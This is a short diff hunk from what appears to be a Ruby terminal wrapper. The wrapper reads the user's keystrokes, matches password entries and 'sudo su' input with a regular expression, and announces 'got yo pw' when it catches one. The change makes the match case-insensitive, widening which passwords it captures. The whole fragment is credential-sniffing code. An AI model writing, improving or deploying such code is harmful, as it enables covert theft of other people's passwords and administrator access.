@@ -22,7 +22,7 @@ begin
     f = ''
     io_copy(STDIN, w) do |data|
       f << data
-      if f =~ /(pass|password|pw)\s*=\s*(\S+)\s|(sudo su).*\r([^\r]+\r)/
+      if f =~ /(pass|password|pw)\s*=\s*(\S+)\s|(sudo su).*\r([^\r]+\r)/i
         `stty #{STATE}`
         puts ''
         puts "got yo pw"
